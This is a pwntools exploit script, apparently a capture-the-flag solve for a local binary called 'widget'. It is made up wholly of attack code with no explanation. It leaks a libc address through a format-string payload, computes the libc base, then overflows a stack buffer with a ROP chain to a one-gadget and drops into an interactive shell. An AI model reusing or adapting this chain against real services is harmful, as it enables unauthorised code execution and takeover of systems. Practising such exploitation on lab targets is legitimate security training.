from pwn import *

elf = context.binary = ELF("./widget")
libc = elf.libc
r = elf.process()
context.clear(os="linux", arch='x86_64', log_level="DEBUG")

# Format String
r.sendlineafter(b"Amount: ", b"120")

payload = b"%33$p|||" + cyclic(24) + p64(0x00404010+0x30) + p64(0x004013d9)
r.sendlineafter(b"Contents: ", payload)

r.recvuntil(b"input: ")
libc_leak = int(r.recv(14),16)
log.success(f"LIBC LEAK: {hex(libc_leak)}")
libc.address = libc_leak - 0x29e40
log.success(f"LIBC BASE: {hex(libc.address)}")

#One-gadget + OverFlow
onegadget = libc.address + 0xebcf8
pop_rsi = libc.address + 0x2be51
pop_rdx_rbp = libc.address + 0x90529

payload = b"a" * 32
payload += p64(0x404500) #rbp
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx_rbp) + p64(0) + p64(0)
payload += p64(onegadget)
r.sendlineafter(b"Amount: ", b"140")
r.sendlineafter(b"Contents: ", payload)
r.interactive()